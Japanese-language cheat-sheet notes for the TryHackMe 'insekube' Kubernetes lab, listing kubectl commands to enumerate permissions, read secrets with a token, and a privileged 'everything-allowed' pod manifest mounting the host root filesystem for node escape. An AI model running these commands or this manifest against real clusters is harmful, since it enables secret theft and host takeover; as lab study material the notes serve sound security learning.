# Kubernetes

https://tryhackme.com/room/insekube

自分の権限を確認

```sh
kubectl auth can-i --list

kubectl auth can-i --list --token=${TOKEN}
```

secrets をgetできる場合

```sh
kubectl get secrets
```

```sh
kubectl describe secret 
```

```sh
kubectl exec -it <pod-name> --token=${TOKEN} -- /bin/bash
```

## すべてを許可する設定のPod設定

権限さえあれば。

```sh
kubectl auth can-i --list
Resources   Non-Resource URLs   Resource Names   Verbs
*.*         []                  []               [*]
            [*]                 []               [*]
```

https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml

privesc.yml 

```yml
apiVersion: v1
kind: Pod
metadata:
  name: everything-allowed-exec-pod
  labels:
    app: pentest
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: everything-allowed-pod
    image: ubuntu
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
  volumes:
  - name: noderoot
    hostPath:
      path: /
```

```sh
kubectl apply -f privesc.yml --token=${TOKEN}

kubectl exec -it everything-allowed-exec-pod --token=${TOKEN} -- /bin/bash
```

## microk8s

下記の形でコマンドを実行する

```sh
microk8s kubectl ...
```
